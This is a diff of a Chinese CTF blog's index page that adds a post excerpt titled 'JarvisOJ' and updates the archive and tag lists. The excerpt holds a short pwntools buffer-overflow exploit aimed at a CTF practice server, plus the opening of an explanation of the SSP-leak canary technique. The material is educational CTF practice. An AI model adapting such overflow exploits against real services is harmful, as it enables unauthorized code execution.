@@ -346,6 +346,46 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2020/01/09/JarvisOJ/" >
+            
+                <span>JarvisOJ</span>
+        </a>
+        <div class="abstract-content">
+            Tell Me Somethingfrom pwn import *
+context.log_level = 'debug'
+p=remote('pwn.jarvisoj.com',9876)
+#p=process('./1')
+offset=136
+payload=offset*'a'
+payload+=p64(0x400620)
+p.sendline(payload)
+p.interactive()
+Smashes(SSP leak)1.SSP leak 
+SSP leak 就是通过故意触发canary的保护来输出我们想要地址上的值。 
+当canary被覆盖是会触发__stack_c...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/01/09</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Jarvis PWN">Jarvis PWN</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/12/29/PWN/" >
             
                 <span>PWN(持续更新)</span>
@@ -692,9 +732,24 @@ for i in range (1,2000):
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 5
+        Total : 6
         </div>
         <!-- search  -->
         
@@ -704,6 +759,20 @@ for i in range (1,2000):
     
     
     
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/JarvisOJ/" >JarvisOJ</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
@@ -725,12 +794,12 @@ for i in range (1,2000):
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华东北赛区-WEB2/" >CISCN2019 华东北赛区 WEB2</a>
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华北赛区-Day1-Web2-ikun/" >CISCN2019 华北赛区 Day1 Web2 ikun</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华北赛区-Day1-Web2-ikun/" >CISCN2019 华北赛区 Day1 Web2 ikun</a>
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华东北赛区-WEB2/" >CISCN2019 华东北赛区 WEB2</a>
         </li>
     
     </div>
@@ -738,11 +807,13 @@ for i in range (1,2000):
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="BUUCTF pwn"><span class="iconfont-archer">&#xe606;</span>BUUCTF pwn</span>
+        <span class="sidebar-tag-name" data-tags="Jarvis PWN"><span class="iconfont-archer">&#xe606;</span>Jarvis PWN</span>
+    
+        <span class="sidebar-tag-name" data-tags="BUUCTF web"><span class="iconfont-archer">&#xe606;</span>BUUCTF web</span>
     
         <span class="sidebar-tag-name" data-tags="学习总结"><span class="iconfont-archer">&#xe606;</span>学习总结</span>
     
-        <span class="sidebar-tag-name" data-tags="BUUCTF web"><span class="iconfont-archer">&#xe606;</span>BUUCTF web</span>
+        <span class="sidebar-tag-name" data-tags="BUUCTF pwn"><span class="iconfont-archer">&#xe606;</span>BUUCTF pwn</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
